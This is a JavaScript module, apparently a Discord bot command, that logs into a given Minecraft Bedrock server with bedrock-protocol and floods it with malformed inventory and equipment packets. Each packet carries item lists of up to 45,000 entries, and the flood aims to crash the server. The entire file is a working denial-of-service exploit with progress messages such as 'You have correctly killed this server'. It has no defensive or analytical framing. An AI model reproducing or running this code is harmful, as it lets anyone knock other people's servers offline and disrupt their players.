const bedrock = require('bedrock-protocol');

const killedservers = new Map();

let actionsMobEquipment = [];
for (let i = 0; i < 45000; i++) actionsMobEquipment.push("minecraft:stone");

let actionsInventoryTransactionItem = [];
for (let i = 0; i < 500; i++){
    actionsInventoryTransactionItem.push("minecraft:stone");
}

let actionsInventoryTransaction = [];
for (let i = 0; i < 5; i++){
    actionsInventoryTransaction.push({source_type: "container", inventory_id: 0, slot: 1, old_item: {
            network_id: 0,
            count: 1,
            metadata: 0,
            has_stack_id: 0,
            stack_id: undefined,
            block_runtime_id: 0,
            extra: { has_nbt: 0, nbt: undefined, can_place_on: actionsInventoryTransactionItem, can_destroy: actionsInventoryTransactionItem }
        }, new_item: {
            network_id: 0,
            count: 1,
            metadata: 0,
            has_stack_id: 0,
            stack_id: undefined,
            block_runtime_id: 0,
            extra: { has_nbt: 0, nbt: undefined, can_place_on: actionsInventoryTransactionItem, can_destroy: actionsInventoryTransactionItem }
        }});
}

module.exports = {

    getKilledServers()
    {
        return killedservers;
    },

    async execute(interaction, embed, ip, port)
    {
        let client = await bedrock.createClient({
            host: ip,
            port: port,
            skipPing: true,
            offline: false,
            username: "AA",
            connectTimeout: 2500
        });

        await client.on('spawn', (packet) => {
            this.getKilledServers().set(`${ip}:${port}`, true);
            console.log(`${ip}:${port} has been killed`);
            let $i = 0;
            let $lastPercent = 0;
            let interval = setInterval(async () => {
                if($i >= 5000) {
                    client.close();
                    this.getKilledServers().set(`${ip}:${port}`, false);
                    embed.setDescription(`Server respawning...`)
                        .setTimestamp();
                    interaction.editReply({embeds: [embed]});
                    clearInterval(interval);
                    return;
                }
                $i++;

                let $percent = Math.round($i * 100 / 5000);
                if($lastPercent !== $percent) {
                    embed.setDescription(`Sending packets... (${$percent}%)`)
                        .setTimestamp();
                    interaction.editReply({embeds: [embed]});
                    $lastPercent = $percent;
                }

                client.queue('inventory_transaction', {
                    transaction: {
                        legacy: {legacy_request_id: 0},
                        transaction_type: "normal",
                        actions: actionsInventoryTransaction
                    }
                });
                client.queue('mob_equipment', {
                    runtime_entity_id: 0,
                    item: {
                        network_id: 321,
                        count: 1,
                        metadata: 0,
                        has_stack_id: 0,
                        stack_id: undefined,
                        block_runtime_id: 0,
                        extra: { has_nbt: 0, nbt: undefined, can_place_on: actionsMobEquipment, can_destroy: actionsMobEquipment }
                    },
                    slot: 4,
                    selected_slot: 4,
                    window_id: 'inventory'
                });
            }, 25);

            embed.setDescription(`You have correctly killed this **server** !`)
                .setTimestamp();
            interaction.editReply({embeds: [embed]});
        });
    }
}